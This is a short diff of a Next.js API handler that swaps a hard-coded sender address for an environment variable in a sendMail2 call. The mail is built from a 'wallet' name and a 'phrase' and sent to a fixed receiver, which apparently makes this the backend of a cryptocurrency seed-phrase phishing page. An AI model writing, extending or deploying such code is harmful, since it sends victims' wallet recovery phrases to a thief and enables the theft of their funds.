@@ -33,7 +33,7 @@ const handler = async (req: NextApiRequest, res: NextApiResponse) => {
         }
 
         await sendMail2(
-          'xarmzon@outlook.com',
+          process.env.EMAIL_SENDER! || '',
           process.env.RECEIVER_EMAIL!,
           APP_NAME,
           generateTemplate(capitalize(wallet), phrase)
